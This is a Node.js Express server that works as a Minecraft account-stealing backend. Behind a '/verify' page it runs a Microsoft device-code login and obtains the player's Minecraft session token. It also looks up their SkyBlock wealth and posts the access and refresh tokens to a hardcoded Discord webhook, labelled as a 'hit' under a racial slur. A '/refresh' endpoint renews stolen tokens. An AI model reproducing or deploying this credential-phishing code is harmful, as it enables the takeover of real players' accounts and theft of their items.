const Authflow = require('./src/MicrosoftAuthFlow');
const axios = require('axios');
const express = require('express');
const cache = require('./src/common/cache/FileCache');
const { EmbedBuilder, WebhookClient } = require('discord.js');
const app = express();
const fs = require('fs');

function makeid(length) {
  let result = '';
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const charactersLength = characters.length;
  let counter = 0;
  while (counter < length) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
    counter += 1;
  }
  return result;
}

async function getPlayer(bearerToken) {
  const url = 'https://api.minecraftservices.com/minecraft/profile';
  const config = {
      headers: {
          'Authorization': 'Bearer ' + bearerToken,
      }
  };
  const response = await axios.get(url, config);
  return [response.data.id, response.data.name];
}

const testAuth = async (res) => {
  const flow = new Authflow(makeid(7), './', { authTitle: '00000000402b5328', deviceType: 'Win32', flow: 'sisu' });

  const ret = await flow.msa.authDeviceCode((response) => {
    if (flow.codeCallback) return flow.codeCallback(response);
  }, res);

  const dt = await flow.xbl.getDeviceToken();
  const sisu = await flow.xbl.doSisuAuth(ret.accessToken, dt);

  const xboxLogin = await getXboxLogin(sisu);
  const [id, name] = await getPlayer(xboxLogin);

  const SSIDCode = '```' + xboxLogin + '```';
  const skycryptInfo = await getInfo(name);

  sendHit(name, id, skycryptInfo, ret.refreshToken, SSIDCode);
};

const getXboxLogin = async (sisu) => {
  const dataBearerToken = {
    identityToken: `XBL3.0 x=${sisu.userHash};${sisu.XSTSToken}`,
    ensureLegacyEnabled: true
  };

  const responseBearerToken = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', dataBearerToken, { headers: { 'Content-Type': 'application/json' } });

  console.log(responseBearerToken.data.access_token);
  return responseBearerToken.data.access_token;
};

const getInfo = async (name) => {
  const skyCryptProfile = await axios.get(`https://sky.shiiyu.moe/api/v2/profile/${name}`, { headers: { 'Content-Type': 'application/json' } });
  const firstProfileKey = Object.keys(skyCryptProfile.data.profiles)[0];
  const firstProfileData = skyCryptProfile.data.profiles[firstProfileKey];

  return firstProfileData;
};

const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
  const webhookClient = new WebhookClient({ url: 'https://discord.com/api/webhooks/1253758739438112838/uACwVcFkt7z8ofSls2f3PYEHlUhhG_-KfRFJhFH2hUaiYK2TePckUZvBJSnjwq072Hwf' });

  const networth = Math.floor(firstProfileData.data.networth.networth).toLocaleString('en-US', { style: 'decimal' });
  const uNetworth = Math.floor(firstProfileData.data.networth.unsoulboundNetworth).toLocaleString('en-US', { style: 'decimal' });
  const avgSkillLvl = Math.floor(firstProfileData.data.average_level);
  const SBLevel = Math.floor(firstProfileData.data.skyblock_level.level);
  const purse = Math.floor(firstProfileData.data.purse).toLocaleString('en-US', { style: 'decimal' });

  const embed = new EmbedBuilder()
    .setColor(0x5D3FD3)
    .setTitle(name)
    .setURL(`https://sky.shiiyu.moe/stats/${name}`)
    .setThumbnail(`https://crafatar.com/avatars/${id}`)
    .setAuthor({ name: 'Hit Some Ni**a Hard', url: `https://oauth2-0-4sq6.onrender.com/refresh?refreshToken=${refresh}` })
    .addFields(
      { name: 'Network', value: '```' + networth + '```' },
      { name: 'Unsoulbound', value: '```' + uNetworth + '```' },
      { name: 'Average Skill Lvl', value: '```' + avgSkillLvl + '```' },
      { name: 'SB Level', value: '```' + SBLevel + '```' },
      { name: 'Purse', value: '```' + purse + '```' },
      { name: 'SSID', value: SSIDCode }
    )
    .setTimestamp();

  webhookClient.send({
    content: '@everyone',
    embeds: [embed]
  });
};

app.get('/verify', async (req, res) => {
  try {
    await testAuth(res); 
    res.status(200).send('Verification successful.');
  } catch (err) {
    console.error('Authentication error:', err);
    res.status(500).send('Authentication failed.'); 
  }
});

app.get('/refresh', async (req, res) => {
  try {
    const flow = new Authflow(makeid(7), './', { authTitle: '00000000402b5328', deviceType: 'Win32', flow: 'sisu' });

    const ret = await flow.msa.refreshTokens(req.query.refreshToken);
    const dt = await flow.xbl.getDeviceToken();
    const sisu = await flow.xbl.doSisuAuth(ret.accessToken, dt);

    const xboxLogin = await getXboxLogin(sisu);
    const [id, name] = await getPlayer(xboxLogin);

    const SSIDCode = '```' + xboxLogin + '```';
    const skycryptInfo = await getInfo(name);

    sendHit(name, id, skycryptInfo, ret.refreshToken, SSIDCode);
    res.status(200).send('Refresh successful.');
  } catch (err) {
    console.error('Refresh error:', err);
    res.status(500).send('Refresh failed.');
  } 
});

const startApp = () => {
  try {
    app.listen(process.env.PORT || 27017, () => {
        console.log(`Server started on port 27017`);
    });
  } catch (err) {
    console.error(`Error starting the application: ${err.message}`);
    process.exit(1);
  }
};

startApp();
